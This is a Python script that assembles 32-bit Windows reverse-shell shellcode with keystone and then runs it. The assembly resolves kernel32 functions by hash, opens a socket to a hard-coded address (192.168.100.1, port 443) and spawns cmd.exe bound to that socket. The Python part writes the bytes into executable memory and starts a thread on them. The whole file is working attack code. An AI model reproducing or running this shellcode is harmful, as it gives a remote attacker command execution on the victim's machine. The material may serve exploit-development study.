import struct, ctypes
from keystone import *
ASSEMBLY = (
"start:"
"                     mov ebp, esp               ;"
"add esp, 0xffffff82        ;"
"add esp, 0xffffff82        ;"
"add esp, 0xffffff82        ;"
"add esp, 0xffffff82        ;"
"add esp, 0xffffff82        ;"
"add esp, 0xffffff82        ;"
"add esp, 0xffffff82        ;"
"add esp, 0xffffff82        ;"
"find_kernel32:"
"             xor ecx, ecx               ;"
"mov esi, fs:[ecx+30h]      ;"
"mov esi, [esi+0Ch]         ;"
"mov esi, [esi+1Ch]         ;"
"next_module:"
"               mov ebx, [esi+8h]          ;"
"mov edi, 0xffffffe0        ;"
"neg edi                    ;"
"add edi, esi               ;"
"mov edi, [edi]             ;"
"mov esi, [esi]             ;"
"cmp [edi+12*2], cx         ;"
"jne next_module            ;"
"jmp push_eip               ;"
"pop_eip:"
"                   pop esi                    ;"
"mov [ebp+0x04], esi        ;"
"jmp find_funcs             ;"
"push_eip:"
"                  call pop_eip               ;"
"find_function:"
"             pushad                     ;"
"mov eax, [ebx+0x3c]        ;"
"mov edi, [ebx+eax+0x78]    ;"
"add edi, ebx               ;"
"mov ecx, [edi+0x18]        ;"
"mov edx, 0xffffffe0        ;"
"neg edx                    ;"
"add edx, edi               ;"
"mov eax, [edx]             ;"
"add eax, ebx               ;"
"mov [ebp-4], eax           ;"
"find_function_loop:"
"        jecxz end_func_loop        ;"
"dec ecx                    ;"
"mov eax, [ebp-4]           ;"
"mov esi, [eax+ecx*4]       ;"
"add esi, ebx               ;"
"compute_hash:"
"              xor eax, eax               ;"
"cdq                        ;"
"cld                        ;"
"compute_hash_l:"
"            lodsb                      ;"
"test al, al                ;"
"jz compute_hash_fin        ;"
"ror edx, 0x0d              ;"
"add edx, eax               ;"
"jmp compute_hash_l         ;"
"compute_hash_fin:"
"          find_function_cmp:"
"         cmp edx, [esp+0x24]        ;"
"jnz find_function_loop     ;"
"mov edx, [edi+0x24]        ;"
"add edx, ebx               ;"
"mov cx, [edx+2*ecx]        ;"
"mov edx, [edi+0x1C]        ;"
"add edx, ebx               ;"
"mov eax, [edx+4*ecx]       ;"
"add eax, ebx               ;"
"mov [esp+0x1C], eax        ;"
"end_func_loop:"
"             popad                      ;"
"ret                        ;"
"find_funcs:"
"                push 0x78b5b983            ;"
"call dword ptr [ebp+0x04]  ;"
"mov [ebp+0x08], eax        ;"
"push 0xec0e4e8e            ;"
"call dword ptr [ebp+0x04]  ;"
"mov [ebp+0x0c], eax        ;"
"push 0x16b3fe72              ;"
"call dword ptr [ebp+0x04]                      ;"
"mov [ebp+0x10], eax                            ;"
"xor eax, eax;"
" mov ax, 0x6c6c;"
" push eax;"
" push 0x642e3233;"
"  push 0x5f327377;"
"    push esp		;"
"call dword ptr [ebp+0x0c]  ;"
"find_user32_funcs:"
"		mov ebx, eax				;"
"push 0x3bfcedcb	;"
"call dword ptr [ebp+0x04]  ;"
"mov [ebp+0x14], eax        ;"
"push 0xadf509d9	;"
"call dword ptr [ebp+0x04]      ;"
"mov [ebp+0x18], eax           ;"
"push 0xb32dba0c	;"
"call dword ptr [ebp+0x04]      ;"
"mov [ebp+0x1C], eax           ;"
"callwsastartup:"
"           xor ecx, ecx               ;"
"mov eax, esp               ;"
"mov cx, 0x590              ;"
"sub eax, ecx               ;"
"push eax                   ;"
"xor eax, eax               ;"
"mov ax, 0x0202             ;"
"push eax                   ;"
"call dword ptr [ebp+0x14]  ;"
"xor   eax, eax             ;"
"push  eax                  ;"
"push  eax                  ;"
"push  eax                  ;"
"mov   al, 0x06             ;"
"push  eax                  ;"
"sub   al, 0x05             ;"
"push  eax                  ;"
"inc   eax                  ;"
"push  eax                  ;"
"call dword ptr [ebp+0x18]  ;"
"mov   esi, eax             ;"
"xor   eax, eax             ;"
"push  eax                  ;"
"push  eax                  ;"
"push  0x0164a8c0          ;"
"mov   ax, 0xBB01        ;"
"shl   eax, 0x10            ;"
"add   ax, 0x02             ;"
"push  eax                  ;"
"push  esp                  ;"
"pop   edi                  ;"
"xor   eax, eax             ;"
"push  eax                  ;"
"push  eax                  ;"
"push  eax                  ;"
"push  eax                  ;"
"add   al, 0x10             ;"
"push  eax                  ;"
"push  edi                  ;"
"push  esi                  ;"
"call dword ptr [ebp+0x1C]  ;"
"create_startupinfoa:"
"            push  esi                       ;"
"push  esi                       ;"
"push  esi                       ;"
"xor   eax, eax                  ;"
"push  eax                       ;"
"push  eax                       ;"
"mov   al, 0x7f                  ;"
"inc   al                        ;"
"xor   ecx, ecx                  ;"
"mov   cl, 0x7f                  ;"
"inc   cl                        ;"
"add   eax, ecx                  ;"
"push  eax                       ;"
"xor   eax, eax                  ;"
"push  eax                       ;"
"push  eax                       ;"
"push  eax                       ;"
"push  eax                       ;"
"push  eax                       ;"
"push  eax                       ;"
"push  eax                       ;"
"push  eax                       ;"
"push  eax                       ;"
"push  eax                       ;"
"mov   al, 0x44                  ;"
"push  eax                       ;"
"push  esp                       ;"
"pop   edi                       ;"
"xor eax, eax;"
" mov ah, 0x65;"
" shl eax, 8;"
" mov ax, 0x7865;"
" push eax;"
" push 0x2e646d63;"
" push  esp                       ;"
"pop   ebx                       ;"
"call_createprocessa:"
"            mov   eax, esp                  ;"
"xor   ecx, ecx                  ;"
"mov   cx, 0x390                 ;"
"sub   eax, ecx                  ;"
"push  eax                       ;"
"push  edi                       ;"
"xor   eax, eax                  ;"
"push  eax                       ;"
"push  eax                       ;"
"push  eax                       ;"
"inc   eax                       ;"
"push  eax                       ;"
"dec   eax                       ;"
"push  eax                       ;"
"push  eax                       ;"
"push  ebx                       ;"
"push  eax                       ;"
"call dword ptr [ebp+0x10]       ;"
"gracefully_exit:"
"           xor eax, eax               ;"
"push eax                   ;"
"push 0xffffffff            ;"
"call dword ptr [ebp+0x08]  ;"

)
# Build the shell code
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(ASSEMBLY)
print(f"Encoded {count} instructions")
sh = b""
shellcode_printable = ""
for e in encoding:
	sh += struct.pack("B", e)
	shellcode_printable += "\\x{0:02x}".format(int(e)).rstrip("\n")
shellcode = bytearray(sh)
print(f"size = {len(shellcode)}")
print("shellcode = b\"" + shellcode_printable + "\"")


ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
						ctypes.c_int(len(shellcode)),
						ctypes.c_int(0x3000),
						ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
					buf,
					ctypes.c_int(len(shellcode)))
print(f"Shellcode located at address {hex(ptr)}")
input("...PRESS ENTER TO RUN THE SHELLCODE...")
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
					ctypes.c_int(0),
					ctypes.c_int(ptr),
					ctypes.c_int(0),
					ctypes.c_int(0),
					ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
					ctypes.c_int(-1))
